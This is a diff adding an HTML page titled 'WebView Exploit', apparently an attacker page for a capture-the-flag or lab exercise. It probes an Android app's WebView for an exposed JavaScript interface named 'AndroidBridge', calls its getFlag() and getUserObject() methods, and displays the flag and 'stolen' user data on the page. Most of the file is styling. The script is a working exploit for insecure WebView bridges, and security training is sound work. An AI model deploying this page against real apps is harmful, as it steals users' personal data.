@@ -1,0 +1,413 @@
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebView Exploit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #141414;
+            color: #3AFF7A;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        .status-bar {
+            background-color: #000000;
+            padding: 12px 16px;
+            border-bottom: 2px solid #3AFF7A;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            box-shadow: 0 2px 8px rgba(58, 255, 122, 0.2);
+        }
+
+        .time {
+            font-weight: bold;
+        }
+
+        .signal {
+            letter-spacing: 2px;
+        }
+
+        .container {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .exploit-card {
+            background-color: #1a1a1a;
+            border: 2px solid #3AFF7A;
+            border-radius: 8px;
+            padding: 30px;
+            max-width: 90%;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 0 20px rgba(58, 255, 122, 0.3), inset 0 0 10px rgba(58, 255, 122, 0.1);
+        }
+
+        h1 {
+            color: #FFD95F;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 24px;
+            text-shadow: 0 0 10px rgba(255, 217, 95, 0.5);
+        }
+
+        .subtitle {
+            color: #3AFF7A;
+            text-align: center;
+            font-size: 12px;
+            margin-bottom: 25px;
+            opacity: 0.8;
+            letter-spacing: 1px;
+        }
+
+        .status-item {
+            margin-bottom: 15px;
+            padding: 12px;
+            background-color: #0a0a0a;
+            border-left: 3px solid #3AFF7A;
+            border-radius: 4px;
+        }
+
+        .status-label {
+            color: #FFD95F;
+            font-size: 12px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .status-value {
+            color: #3AFF7A;
+            font-size: 14px;
+            font-weight: bold;
+            word-break: break-all;
+        }
+
+        .error-status {
+            color: #F93827;
+            border-left-color: #F93827;
+        }
+
+        .success-status {
+            color: #3AFF7A;
+            border-left-color: #3AFF7A;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes glitch {
+            0%, 100% {
+                text-shadow: 0 0 10px rgba(58, 255, 122, 0.8);
+            }
+            50% {
+                text-shadow: 0 0 20px rgba(255, 217, 95, 0.8);
+            }
+        }
+
+        .exploiting {
+            animation: glitch 0.5s ease-in-out infinite;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 25px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: 2px solid #3AFF7A;
+            background-color: #0a0a0a;
+            color: #3AFF7A;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        button:hover {
+            background-color: #3AFF7A;
+            color: #000000;
+            box-shadow: 0 0 15px rgba(58, 255, 122, 0.8);
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #3AFF7A;
+            font-size: 11px;
+            opacity: 0.6;
+            border-top: 1px solid #3AFF7A;
+            margin-top: 30px;
+        }
+
+        .alert-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .alert-modal.show {
+            display: flex;
+        }
+
+        .alert-content {
+            background-color: #1a1a1a;
+            border: 2px solid #F93827;
+            border-radius: 8px;
+            padding: 25px;
+            max-width: 90%;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 30px rgba(249, 56, 39, 0.5);
+        }
+
+        .alert-title {
+            color: #F93827;
+            font-size: 18px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .alert-message {
+            color: #3AFF7A;
+            margin-bottom: 20px;
+            font-size: 14px;
+            word-break: break-all;
+            line-height: 1.5;
+        }
+
+        .alert-close {
+            width: 100%;
+            background-color: #F93827;
+            color: #ffffff;
+            border-color: #F93827;
+        }
+
+        .alert-close:hover {
+            background-color: #cc2a1f;
+        }
+
+        .scan-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #3AFF7A, transparent);
+            animation: scan 3s linear infinite;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100vh; }
+        }
+    </style>
+</head>
+<body>
+    <div class="scan-line"></div>
+
+    <div class="status-bar">
+        <span class="time" id="statusTime">09:41</span>
+        <span class="signal">▮▮▮▮▯</span>
+    </div>
+
+    <div class="container">
+        <div class="exploit-card">
+            <h1>⚡ WebView Exploit</h1>
+            <div class="subtitle">Mobile Application Attack Vector</div>
+
+            <div id="statusContainer">
+                <div class="status-item">
+                    <div class="status-label">Bridge Status</div>
+                    <div class="status-value" id="bridgeStatus">
+                        <span class="loading-spinner">⟳</span>Scanning...
+                    </div>
+                </div>
+
+                <div class="status-item">
+                    <div class="status-label">Exploit Status</div>
+                    <div class="status-value" id="exploitStatus">Idle</div>
+                </div>
+
+                <div class="status-item" id="flagContainer" style="display: none;">
+                    <div class="status-label">🚨 Flag Retrieved</div>
+                    <div class="status-value success-status" id="flagContent"></div>
+                </div>
+
+                <div class="status-item" id="userDataContainer" style="display: none;">
+                    <div class="status-label">👤 User Data Stolen</div>
+                    <div class="status-value success-status" id="userDataContent"></div>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button id="attackBtn">Exploit</button>
+                <button id="resetBtn">Reset</button>
+            </div>
+
+            <div class="footer">
+                INSECURE WEBVIEW DETECTED 
+            </div>
+        </div>
+    </div>
+
+    <div class="alert-modal" id="alertModal">
+        <div class="alert-content">
+            <div class="alert-title" id="alertTitle">Alert</div>
+            <div class="alert-message" id="alertMessage"></div>
+            <button class="alert-close" onclick="closeAlert()">OK</button>
+        </div>
+    </div>
+
+    <script>
+
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('statusTime').textContent = 
+                String(now.getHours()).padStart(2, '0') + ':' + 
+                String(now.getMinutes()).padStart(2, '0');
+        }
+        setInterval(updateTime, 1000);
+
+        function showAlert(title, message) {
+            document.getElementById('alertTitle').textContent = title;
+            document.getElementById('alertMessage').textContent = message;
+            document.getElementById('alertModal').classList.add('show');
+        }
+
+        function closeAlert() {
+            document.getElementById('alertModal').classList.remove('show');
+        }
+
+        function stealFlag() {
+            const statusElem = document.getElementById('exploitStatus');
+            const bridgeElem = document.getElementById('bridgeStatus');
+            
+            statusElem.classList.add('exploiting');
+            statusElem.textContent = '⚡ Exploiting...';
+            
+            setTimeout(() => {
+                try {
+                    if (typeof AndroidBridge !== 'undefined') {
+                        const stolenFlag = AndroidBridge.getFlag();
+                        const stolenData = AndroidBridge.getUserObject();
+                        
+                        statusElem.classList.remove('exploiting');
+                        statusElem.textContent = '✓ SUCCESS';
+                        statusElem.style.color = '#3AFF7A';
+                        
+                        bridgeElem.innerHTML = '<span style="color: #3AFF7A;">✓ Bridge Found</span>';
+                        
+                        //  flag
+                        document.getElementById('flagContainer').style.display = 'block';
+                        document.getElementById('flagContent').textContent = stolenFlag;
+                        
+                        //  user data
+                        document.getElementById('userDataContainer').style.display = 'block';
+                        const userDataFormatted = typeof stolenData === 'string' 
+                            ? stolenData 
+                            : JSON.stringify(stolenData, null, 2);
+                        document.getElementById('userDataContent').innerHTML = userDataFormatted.replace(/\n/g, '<br>');
+                        
+                        const alertMessage = 'FLAG: ' + stolenFlag + '\n'+ '\nUSER DATA:\n' + userDataFormatted;
+                        showAlert('🚨 EXPLOIT SUCCESS', alertMessage);
+                        AndroidBridge.showToast('Data stolen successfully!');
+                    } else {
+                        statusElem.classList.remove('exploiting');
+                        statusElem.textContent = '✗ Failed';
+                        statusElem.style.color = '#F93827';
+                        
+                        bridgeElem.innerHTML = '<span style="color: #F93827;">✗ Bridge Not Found</span>';
+                        showAlert('EXPLOIT FAILED', 'AndroidBridge not found in this WebView.');
+                    }
+                } catch (error) {
+                    statusElem.classList.remove('exploiting');
+                    statusElem.textContent = '✗ Error';
+                    statusElem.style.color = '#F93827';
+                    showAlert('ERROR', 'An error occurred: ' + error.message);
+                }
+            }, 1500);
+        }
+
+        function reset() {
+            document.getElementById('bridgeStatus').innerHTML = '<span class="loading-spinner">⟳</span>Scanning...';
+            document.getElementById('exploitStatus').textContent = 'Idle';
+            document.getElementById('exploitStatus').style.color = '#3AFF7A';
+            document.getElementById('exploitStatus').classList.remove('exploiting');
+            document.getElementById('flagContainer').style.display = 'none';
+            document.getElementById('userDataContainer').style.display = 'none';
+        }
+
+        document.getElementById('attackBtn').addEventListener('click', stealFlag);
+        document.getElementById('resetBtn').addEventListener('click', reset);
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const bridgeElem = document.getElementById('bridgeStatus');
+                if (typeof AndroidBridge !== 'undefined') {
+                    bridgeElem.innerHTML = '<span style="color: #3AFF7A;">✓ Bridge Found</span>';
+                } else {
+                    bridgeElem.innerHTML = '<span style="color: #FFD95F;">⚠ No Bridge Detected</span>';
+                }
+            }, 1000);
+        });
+
+
+        document.getElementById('alertModal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('alertModal')) {
+                closeAlert();
+            }
+        });
+    </script>
+</body>
+</html>
+    
